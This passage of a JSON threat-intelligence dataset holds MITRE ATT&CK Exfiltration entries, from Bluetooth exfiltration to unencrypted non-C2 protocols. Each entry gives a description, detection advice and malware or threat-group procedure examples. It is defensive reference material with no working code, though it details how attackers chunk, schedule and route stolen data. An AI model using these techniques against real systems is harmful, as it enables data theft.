[
  {
    "technique_id": "T1011.001",
    "technique_name": "Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth",
    "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel. Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.",
    "detection": "Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious. Monitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.",
    "procedures": [
      "[S0143] Flame: Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1020.001",
    "technique_name": "Automated Exfiltration: Traffic Duplication",
    "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image. Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to. Adversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.",
    "detection": "Monitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals). Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.",
    "procedures": null,
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1029",
    "technique_name": "Scheduled Transfer",
    "description": "Adversaries may schedule data exfiltration to be performed only at certain times of day or at certain intervals. This could be done to blend traffic patterns with normal activity or availability. When scheduled exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel or Exfiltration Over Alternative Protocol.",
    "detection": "Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious. Network connections to the same destination that occur at the same time of day for multiple days are suspicious.",
    "procedures": [
      "[S0283] jRAT: jRAT can be configured to reconnect at certain intervals.",
      "[S0696] Flagpro: Flagpro has the ability to wait for a specified time interval between communicating with and executing commands from C2.",
      "[S1019] Shark: Shark can pause C2 communications for a specified time.",
      "[S0395] LightNeuron: LightNeuron can be configured to exfiltrate data during nighttime or working hours.",
      "[S0223] POWERSTATS: POWERSTATS can sleep for a given number of seconds.",
      "[S0200] Dipsind: Dipsind can be configured to only run during normal working hours, which would make its communications harder to distinguish from normal traffic.",
      "[S0126] ComRAT: ComRAT has been programmed to sleep outside local business hours (9 to 5, Monday to Friday).",
      "[S0045] ADVSTORESHELL: ADVSTORESHELL collects, compresses, encrypts, and exfiltrates data to the C2 server every 10 minutes.",
      "[S0211] Linfo: Linfo creates a backdoor through which remote attackers can change the frequency at which compromised hosts contact remote C2 infrastructure.",
      "[S1100] Ninja: Ninja can configure its agent to work only in specific time frames.",
      "[S0154] Cobalt Strike: Cobalt Strike can set its Beacon payload to reach out to the C2 server on an arbitrary and random interval.",
      "[S0444] ShimRat: ShimRat can sleep when instructed to do so by the C2.",
      "[S0409] Machete: Machete sends stolen data to the C2 server every 10 minutes.",
      "[G0126] Higaisa: Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.",
      "[S0596] ShadowPad: ShadowPad has sent data back to C2 every 8 hours.",
      "[S0668] TinyTurla: TinyTurla contacts its C2 based on a scheduled timing set in its configuration.",
      "[S0667] Chrommme: Chrommme can set itself to sleep before requesting a new command from C2.",
      "[S0265] Kazuar: Kazuar can sleep for a specific time and be set to communicate at specific intervals."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1030",
    "technique_name": "Data Transfer Size Limits",
    "description": "An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). If a process maintains a long connection during which it consistently sends fixed size data packets or a process opens connections and sends fixed sized data packets at regular intervals, it may be performing an aggregate data transfer. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.",
    "procedures": [
      "[G1040] Play: Play has split victims' files into chunks for exfiltration.",
      "[G1014] LuminousMoth: LuminousMoth has split archived files into multiple parts to bypass a 5MB limit.",
      "[G0027] Threat Group-3390: Threat Group-3390 actors have split RAR files for exfiltration into parts.",
      "[S0264] OopsIE: OopsIE exfiltrates command output and collected files to its C2 server in 1500-byte blocks.",
      "[S0150] POSHSPY: POSHSPY uploads data in 2048-byte chunks.",
      "[C0026] C0026: During C0026, the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.",
      "[S0487] Kessel: Kessel can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.",
      "[S1020] Kevin: Kevin can exfiltrate data to the C2 server in 27-character chunks.",
      "[S0644] ObliqueRAT: ObliqueRAT can break large files of interest into smaller chunks to prepare them for exfiltration.",
      "[S1200] StealBit: StealBit can be configured to exfiltrate files at a specified rate to evade network detection mechanisms.",
      "[S0622] AppleSeed: AppleSeed has divided files if the size is 0x1000000 bytes or more.",
      "[S0154] Cobalt Strike: Cobalt Strike will break large data sets into smaller chunks for exfiltration.",
      "[S0495] RDAT: RDAT can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. RDAT can also download data from the C2 which is split into 81,920-byte portions.",
      "[S0699] Mythic: Mythic supports custom chunk sizes used to upload/download files.",
      "[S1040] Rclone: The Rclone \"chunker\" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.",
      "[G0007] APT28: APT28 has split archived exfiltration files into chunks smaller than 1MB.",
      "[C0015] C0015: During C0015, the threat actors limited Rclone's bandwidth setting during exfiltration.",
      "[S1141] LunarWeb: LunarWeb can split exfiltrated data that exceeds 1.33 MB in size into multiple random sized parts between 384 and 512 KB.",
      "[G0096] APT41: APT41 transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.",
      "[S0030] Carbanak: Carbanak exfiltrates data in compressed chunks if a message is larger than 4096 bytes .",
      "[S0170] Helminth: Helminth splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1041",
    "technique_name": "Exfiltration Over C2 Channel",
    "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.",
    "procedures": [
      "[S1172] OilBooster: OilBooster can use an actor-controlled OneDrive account for C2 communication and exfiltration.",
      "[S0459] MechaFlounder: MechaFlounder has the ability to send the compromised user's account name and hostname within a URL to C2.",
      "[S0428] PoetRAT: PoetRAT has exfiltrated data over the C2 channel.",
      "[S0445] ShimRatReporter: ShimRatReporter sent generated reports to the C2 via HTTP POST requests.",
      "[S1019] Shark: Shark has the ability to upload files from the compromised host over a DNS or HTTP C2 channel.",
      "[S1210] Sagerunex: Sagerunex encrypts collected system data then exfiltrates via existing command and control channels.",
      "[S0533] SLOTHFULMEDIA: SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests.",
      "[S1183] StrelaStealer: StrelaStealer exfiltrates collected email credentials via HTTP POST to command and control servers.",
      "[S1017] OutSteel: OutSteel can upload files from a compromised host over its C2 channel.",
      "[S0234] Bandook: Bandook can upload files from a victim's machine over the C2 channel.",
      "[S0431] HotCroissant: HotCroissant has the ability to download files from the infected host to the command and control (C2) server.",
      "[S1021] DnsSystem: DnsSystem can exfiltrate collected data to its C2 server.",
      "[S0409] Machete: Machete's collected data is exfiltrated over the same channel used for C2.",
      "[S1039] Bumblebee: Bumblebee can send collected data in JSON format to C2.",
      "[S0584] AppleJeus: AppleJeus has exfiltrated collected host information to a C2 server.",
      "[S1090] NightClub: NightClub can use SMTP and DNS for file exfiltration and C2.",
      "[S1188] Line Runner: Line Runner utilizes HTTP to retrieve and exfiltrate information staged using Line Dancer.",
      "[S0670] WarzoneRAT: WarzoneRAT can send collected victim data to its C2 server.",
      "[S0678] Torisma: Torisma can send victim data to an actor-controlled C2 server.",
      "[S1042] SUGARDUMP: SUGARDUMP has sent stolen credentials and other data to its C2 server.",
      "[S1030] Squirrelwaffle: Squirrelwaffle has exfiltrated victim data using HTTP POST requests to its C2 servers.",
      "[G1014] LuminousMoth: LuminousMoth has used malware that exfiltrates stolen data to its C2 server.",
      "[G0034] Sandworm Team: Sandworm Team has sent system information to its C2 server using HTTP.",
      "[G0114] Chimera: Chimera has used Cobalt Strike C2 beacons for data exfiltration.",
      "[C0038] HomeLand Justice: During HomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers.",
      "[S0661] FoggyWeb: FoggyWeb can remotely exfiltrate sensitive information from a compromised AD FS server.",
      "[S0484] Carberp: Carberp has exfiltrated data via HTTP to already established C2 servers.",
      "[S0083] Misdat: Misdat has uploaded files and data to its C2 servers.",
      "[S1142] LunarMail: LunarMail can use email image attachments with embedded data for receiving C2 commands and data exfiltration.",
      "[S1065] Woody RAT: Woody RAT can exfiltrate files from an infected machine to its C2 server.",
      "[S0491] StrongPity: StrongPity can exfiltrate collected documents through C2 channels.",
      "[S0034] NETEAGLE: NETEAGLE is capable of reading files over the C2 channel.",
      "[C0046] ArcaneDoor: ArcaneDoor included use of existing command and control channels for data exfiltration.",
      "[S1185] LightSpy: To exfiltrate data, LightSpy configures each module to send an obfuscated JSON blob to hardcoded URL endpoints or paths aligned to the module name.",
      "[G0093] GALLIUM: GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data.",
      "[G0126] Higaisa: Higaisa exfiltrated data over its C2 channel.",
      "[S0658] XCSSET: XCSSET retrieves files that match the pattern defined in the INAME_QUERY variable within the user's home directory, such as `*test.txt`, and are below a specific size limit. It then archives the files and exfiltrates the data over its C2 channel.",
      "[S0363] Empire: Empire can send data gathered from a target through the command and control channel.",
      "[S0192] Pupy: Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server.",
      "[S0395] LightNeuron: LightNeuron exfiltrates data over its email C2 channel.",
      "[S0531] Grandoreiro: Grandoreiro can send data it retrieves to the C2 server.",
      "[S1201] TRANSLATEXT: TRANSLATEXT has exfiltrated collected credentials to the C2 server.",
      "[S1186] Line Dancer: Line Dancer exfiltrates collected data via command and control channels.",
      "[S0266] TrickBot: TrickBot can send information about the compromised host and upload data to a hardcoded C2 server.",
      "[S1037] STARWHALE: STARWHALE can exfiltrate collected data to its C2 servers.",
      "[S0657] BLUELIGHT: BLUELIGHT has exfiltrated data over its C2 channel.",
      "[S0650] QakBot: QakBot can send stolen information to C2 nodes including passwords, accounts, and emails.",
      "[S0386] Ursnif: Ursnif has used HTTP POSTs to exfil gathered information.",
      "[S1173] PowerExchange: PowerExchange can exfiltrate files via its email C2 channel.",
      "[S0351] Cannon: Cannon exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.",
      "[S1111] DarkGate: DarkGate uses existing command and control channels to retrieve captured cryptocurrency wallet credentials.",
      "[S0674] CharmPower: CharmPower can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST.",
      "[S0340] Octopus: Octopus has uploaded stolen files and data from a victim's machine over its C2 channel.",
      "[S0085] S-Type: S-Type has uploaded data and files from a compromised host to its C2 servers.",
      "[G0004] Ke3chang: Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations.",
      "[S1064] SVCReady: SVCReady can send collected data in JSON format to its C2 server.",
      "[G0087] APT39: APT39 has exfiltrated stolen victim data through C2 communications.",
      "[S0455] Metamorfo: Metamorfo can send the data it collects to the C2 server.",
      "[S0496] REvil: REvil can exfiltrate host and malware information to C2 servers.",
      "[S0079] MobileOrder: MobileOrder exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "[S0367] Emotet: Emotet has exfiltrated data over its C2 channel.",
      "[G0032] Lazarus Group: Lazarus Group has exfiltrated data and files over a C2 channel through its various tools and malware.",
      "[S1025] Amadey: Amadey has sent victim data to its C2 servers.",
      "[S0493] GoldenSpy: GoldenSpy has exfiltrated host environment information to an external C2 domain via port 9006.",
      "[S0062] DustySky: DustySky has exfiltrated data to the C2 server.",
      "[S0251] Zebrocy: Zebrocy has exfiltrated data to the designated C2 server using HTTP POST requests.",
      "[S0375] Remexi: Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel.",
      "[S0600] Doki: Doki has used Ngrok to establish C2 and exfiltrate data.",
      "[S1020] Kevin: Kevin can send data from the victim host through a DNS C2 channel.",
      "[S1156] Manjusaka: Manjusaka data exfiltration takes place over HTTP channels.",
      "[S1022] IceApple: IceApple's Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2.",
      "[S0467] TajMahal: TajMahal has the ability to send collected files over its C2.",
      "[S1029] AuTo Stealer: AuTo Stealer can exfiltrate data over actor-controlled C2 servers via HTTP or TCP.",
      "[C0049] Leviathan Australian Intrusions: Leviathan exfiltrated collected data over existing command and control channels during Leviathan Australian Intrusions.",
      "[G0022] APT3: APT3 has a tool that exfiltrates data over the C2 channel.",
      "[C0017] C0017: During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration.",
      "[S1145] Pikabot: During the initial Pikabot command and control check-in, Pikabot will transmit collected system information encrypted using RC4.",
      "[C0006] Operation Honeybee: During Operation Honeybee, the threat actors uploaded stolen files to their C2 servers.",
      "[S1044] FunnyDream: FunnyDream can execute commands, including gathering user information, and send the results to C2.",
      "[S1153] Cuckoo Stealer: Cuckoo Stealer can send information about the targeted system to C2 including captured passwords, OS build, hostname, and username.",
      "[S1149] CHIMNEYSWEEP: CHIMNEYSWEEP can upload collected files to the command-and-control server.",
      "[G0050] APT32: APT32's backdoor has exfiltrated data using the already opened channel with its C&C server.",
      "[C0022] Operation Dream Job: During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers.",
      "[S0603] Stuxnet: Stuxnet sends compromised victim information via HTTP.",
      "[S0376] HOPLIGHT: HOPLIGHT has used its C2 channel to exfiltrate data.",
      "[S0439] Okrum: Data exfiltration is done by Okrum using the already opened channel with the C2 server.",
      "[S0373] Astaroth: Astaroth exfiltrates collected information from its r1.log file to the external C2 server.",
      "[S0115] Crimson: Crimson can exfiltrate stolen information over its C2.",
      "[S0391] HAWKBALL: HAWKBALL has sent system information and files over the C2 channel.",
      "[S1089] SharpDisco: SharpDisco can load a plugin to exfiltrate stolen files to SMB shares also used in C2.",
      "[S0447] Lokibot: Lokibot has the ability to initiate contact with command and control (C2) to exfiltrate stolen data.",
      "[S0240] ROKRAT: ROKRAT can send collected files back over same C2 channel.",
      "[S0651] BoxCaon: BoxCaon uploads files and data from a compromised host over the existing C2 channel.",
      "[S0595] ThiefQuest: ThiefQuest exfiltrates targeted file extensions in the /Users/ folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.",
      "[S0438] Attor: Attor has exfiltrated data over the C2 channel.",
      "[S0687] Cyclops Blink: Cyclops Blink has the ability to upload exfiltrated files to a C2 server.",
      "[S0568] EVILNUM: EVILNUM can upload files over the C2 channel from the infected host.",
      "[S0520] BLINDINGCAN: BLINDINGCAN has sent user and system information to a C2 server via HTTP POST requests.",
      "[S1160] Latrodectus: Latrodectus can exfiltrate encrypted system information to the C2 server.",
      "[S0663] SysUpdate: SysUpdate has exfiltrated data over its C2 channel.",
      "[S0652] MarkiRAT: MarkiRAT can exfiltrate locally stored data via its C2.",
      "[S1178] ShrinkLocker: ShrinkLocker will exfiltrate victim system information along with the encryption key via an HTTP POST.",
      "[S1016] MacMa: MacMa exfiltrates data from a supplied path over its C2 channel.",
      "[S0476] Valak: Valak has the ability to exfiltrate data over the C2 channel.",
      "[S0441] PowerShower: PowerShower has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.",
      "[S1034] StrifeWater: StrifeWater can send data and files from a compromised host to its C2 server.",
      "[S1166] Solar: Solar can send staged files to C2 for exfiltration.",
      "[S1060] Mafalda: Mafalda can send network system data and files to its C2 server.",
      "[G0094] Kimsuky: Kimsuky has exfiltrated data over its C2 channel.",
      "[S1169] Mango: Mango can use its HTTP C2 channel for exfiltration.",
      "[S0031] BACKSPACE: Adversaries can direct BACKSPACE to upload files to the C2 Server.",
      "[S1213] Lumma Stealer: Lumma Stealer has exfiltrated collected data over existing HTTP and HTTPS C2 channels.",
      "[S0667] Chrommme: Chrommme can exfiltrate collected data via C2.",
      "[S0604] Industroyer: Industroyer sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request.",
      "[S0615] SombRAT: SombRAT has uploaded collected data and files from a compromised host to its C2 server.",
      "[S0381] FlawedAmmyy: FlawedAmmyy has sent data collected from a compromised host to its C2 servers.",
      "[G0128] ZIRCONIUM: ZIRCONIUM has exfiltrated files via the Dropbox API C2.",
      "[S1182] MagicRAT: MagicRAT exfiltrates data via HTTP over existing command and control channels.",
      "[S0649] SMOKEDHAM: SMOKEDHAM has exfiltrated data to its C2 server.",
      "[S0696] Flagpro: Flagpro has exfiltrated data to the C2 server.",
      "[S0622] AppleSeed: AppleSeed can exfiltrate files via the C2 channel.",
      "[S0692] SILENTTRINITY: SILENTTRINITY can transfer files from an infected host to the C2 server.",
      "[S0502] Drovorub: Drovorub can exfiltrate files over C2 infrastructure.",
      "[S0572] Caterpillar WebShell: Caterpillar WebShell can upload files over the C2 channel.",
      "[G1043] BlackByte: BlackByte transmitted collected victim host information via HTTP POST to command and control infrastructure.",
      "[S1170] ODAgent: ODAgent can use an attacker-controlled OneDrive account to receive C2 commands and to exfiltrate files.",
      "[S1075] KOPILUWAK: KOPILUWAK has exfiltrated collected data to its C2 via POST requests.",
      "[C0014] Operation Wocao: During Operation Wocao, threat actors used the XServer backdoor to exfiltrate data.",
      "[S1148] Raccoon Stealer: Raccoon Stealer uses existing HTTP-based command and control channels for exfiltration.",
      "[S0434] Imminent Monitor: Imminent Monitor has uploaded a file containing debugger logs, network information and system information to the C2.",
      "[S0078] Psylo: Psylo exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "[S0147] Pteranodon: Pteranodon exfiltrates screenshot files to its C2 server.",
      "[S0487] Kessel: Kessel has exfiltrated information gathered from the infected system to the C2 server.",
      "[S1059] metaMain: metaMain can upload collected files and data to its C2 server.",
      "[S0610] SideTwist: SideTwist has exfiltrated data over its C2 channel.",
      "[S0461] SDBbot: SDBbot has sent collected data from a compromised host to its C2 servers.",
      "[G0142] Confucius: Confucius has exfiltrated stolen files to its C2 server.",
      "[S0268] Bisonal: Bisonal has added the exfiltrated data to the URL over the C2 channel.",
      "[S0448] Rising Sun: Rising Sun can send data gathered from the infected machine via HTTP POST request to the C2.",
      "[G1035] Winter Vivern: Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.",
      "[S1196] Troll Stealer: Troll Stealer exfiltrates collected information to its command and control infrastructure.",
      "[S1132] IPsec Helper: IPsec Helper exfiltrates specific files through its command and control framework.",
      "[S0385] njRAT: njRAT has used HTTP to receive stolen information from the infected machine.",
      "[S0526] KGH_SPY: KGH_SPY can exfiltrate collected information from the host to the C2 server.",
      "[S1159] DUSTTRAP: DUSTTRAP can exfiltrate collected data over C2 channels.",
      "[S1026] Mongall: Mongall can upload files and information from a compromised host to its C2 server.",
      "[S1122] Mispadu: Mispadu can sends the collected financial data to the C2 server.",
      "[G0102] Wizard Spider: Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels.",
      "[S0238] Proxysvc: Proxysvc performs data exfiltration over the control server channel using a custom protocol.",
      "[S0356] KONNI: KONNI has sent data and files to its C2 server.",
      "[S0633] Sliver: Sliver can exfiltrate files from the victim using the download command.",
      "[S1050] PcShare: PcShare can upload files and information from a compromised host to its C2 servers.",
      "[G1030] Agrius: Agrius exfiltrated staged data using tools such as Putty and WinSCP, communicating with command and control servers.",
      "[S0671] Tomiris: Tomiris can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.",
      "[S0587] Penquin: Penquin can execute the command code do_upload to send files to C2.",
      "[S1024] CreepySnail: CreepySnail can connect to C2 for data exfiltration.",
      "[S0239] Bankshot: Bankshot exfiltrates data over its C2 channel.",
      "[C0001] Frankenstein: During Frankenstein, the threat actors collected information via Empire, which sent the data back to the adversary's C2.",
      "[G0065] Leviathan: Leviathan has exfiltrated data over its C2 channel.",
      "[S0084] Mis-Type: Mis-Type has transmitted collected files and data to its C2 server.",
      "[S0495] RDAT: RDAT can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.",
      "[G0047] Gamaredon Group: A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server.",
      "[S0680] LitePower: LitePower can send collected data, including screenshots, over its C2 channel.",
      "[S0543] Spark: Spark has exfiltrated data over the C2 channel.",
      "[S0045] ADVSTORESHELL: ADVSTORESHELL exfiltrates data over the same channel used for C2.",
      "[S0477] Goopy: Goopy has the ability to exfiltrate data over the Microsoft Outlook C2 channel.",
      "[S0077] CallMe: CallMe exfiltrates data to its C2 server over the same protocol as C2 communications.",
      "[S0588] GoldMax: GoldMax can exfiltrate files over the existing C2 channel.",
      "[G0069] MuddyWater: MuddyWater has used C2 infrastructure to receive exfiltrated data.",
      "[G0038] Stealth Falcon: After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel.",
      "[S0377] Ebury: Ebury exfiltrates a list of outbound and inbound SSH sessions using OpenSSH's `known_host` files and `wtmp` records. Ebury can exfiltrate SSH credentials through custom DNS queries or use the command `Xcat` to send the process's ssh session's credentials to the C2 server.",
      "[S0086] ZLib: ZLib has sent data and files from a compromised host to its C2 servers.",
      "[S0024] Dyre: Dyre has the ability to send information staged on a compromised host externally to C2.",
      "[S1078] RotaJakiro: RotaJakiro sends device and other collected data back to the C2 using the established C2 channels over TCP.",
      "[G1012] CURIUM: CURIUM has used IMAP and SMTPS for exfiltration via tools such as IMAPLoader.",
      "[S0632] GrimAgent: GrimAgent has sent data related to a compromise host over its C2 channel.",
      "[S1081] BADHATCH: BADHATCH can exfiltrate data over the C2 channel.",
      "[S1031] PingPull: PingPull has the ability to exfiltrate stolen victim data through its C2 channel.",
      "[S0538] Crutch: Crutch can exfiltrate data over the primary C2 channel (Dropbox HTTP API).",
      "[S0264] OopsIE: OopsIE can upload files from the victim's machine to its C2 server."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1048.001",
    "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Artifacts and evidence of symmetric key exchange may be recoverable by analyzing network traffic or looking for hard-coded values within malware. If recovered, these keys can be used to decrypt network data from command and control channels.",
    "procedures": null,
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1048.002",
    "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.",
    "procedures": [
      "[G0007] APT28: APT28 has exfiltrated archives of collected data previously staged on a target's OWA server via HTTPS.",
      "[S0483] IcedID: IcedID has exfiltrated collected data via HTTPS.",
      "[G1012] CURIUM: CURIUM has used SMTPS to exfiltrate collected data from victims.",
      "[S1040] Rclone: Rclone can exfiltrate data over SFTP or HTTPS via WebDAV.",
      "[G1046] Storm-1811: Storm-1811 has exfiltrated captured user credentials via Secure Copy Protocol (SCP).",
      "[C0024] SolarWinds Compromise: During the SolarWinds Compromise, APT29 exfiltrated collected data over a simple HTTPS request to a password-protected archive staged on a victim's OWA servers."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1048.003",
    "technique_name": "Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol",
    "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Adversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields.",
    "detection": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. For network infrastructure devices, collect AAA logging to monitor for `copy` commands being run to exfiltrate configuration files to non-standard destinations over unencrypted protocols such as TFTP.",
    "procedures": [
      "[G0032] Lazarus Group: Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims.",
      "[G0061] FIN8: FIN8 has used FTP to exfiltrate collected data.",
      "[S0125] Remsec: Remsec can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.",
      "[S0492] CookieMiner: CookieMiner has used the curl --upload-file command to exfiltrate data over HTTP.",
      "[S1043] ccf32: ccf32 can upload collected data and files to an FTP server.",
      "[S1116] WARPWIRE: WARPWIRE can send captured credentials to C2 via HTTP `GET` or `POST` requests.",
      "[S0356] KONNI: KONNI has used FTP to exfiltrate reconnaissance data out.",
      "[S0252] Brave Prince: Some Brave Prince variants have used South Korea's Daum email service to exfiltrate information, and later variants have posted the data to a web server via an HTTP post command.",
      "[S0674] CharmPower: CharmPower can send victim data via FTP with credentials hardcoded in the script.",
      "[S0050] CosmicDuke: CosmicDuke exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers.",
      "[G0076] Thrip: Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP.",
      "[G0050] APT32: APT32's backdoor can exfiltrate data by encoding it in the subdomain field of DNS packets.",
      "[S0212] CORALDECK: CORALDECK has exfiltrated data in HTTP POST headers.",
      "[G1045] Salt Typhoon: Salt Typhoon has exfiltrated configuration files from exploited network devices over FTP and TFTP.",
      "[G0102] Wizard Spider: Wizard Spider has exfiltrated victim information using FTP.",
      "[S0331] Agent Tesla: Agent Tesla has routines for exfiltration over SMTP, FTP, and HTTP.",
      "[S0428] PoetRAT: PoetRAT has used ftp for exfiltration.",
      "[C0017] C0017: During C0017, APT41 exfiltrated victim data via DNS lookups by encoding and prepending it as subdomains to the attacker-controlled domain.",
      "[G0049] OilRig: OilRig has exfiltrated data via Microsoft Exchange and over FTP separately from its primary C2 channel over DNS.",
      "[S0335] Carbon: Carbon uses HTTP to send data to the C2 server.",
      "[S0190] BITSAdmin: BITSAdmin can be used to create BITS Jobs to upload files from a compromised host.",
      "[S0281] Dok: Dok exfiltrates logs of its execution stored in the /tmp folder over FTP using the curl command.",
      "[G0064] APT33: APT33 has used FTP to exfiltrate files (separately from the C2 channel).",
      "[S0095] ftp: ftp may be used to exfiltrate data separate from the main command and control protocol.",
      "[G0037] FIN6: FIN6 has sent stolen payment card data to remote servers via HTTP POSTs.",
      "[S0487] Kessel: Kessel can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS.",
      "[S0466] WindTail: WindTail has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl.",
      "[S1124] SocGholish: SocGholish can exfiltrate data directly to its C2 domain via HTTP.",
      "[S0107] Cherry Picker: Cherry Picker exfiltrates files over FTP.",
      "[S1040] Rclone: Rclone can exfiltrate data over FTP or HTTP, including HTTP via WebDAV."
    ],
    "tactics": "TA0010 - Exfiltration"
  },
  {
    "technique_id": "T1052.001",
    "technique_name": "Exfiltration Over Physical Medium: Exfiltration over USB",
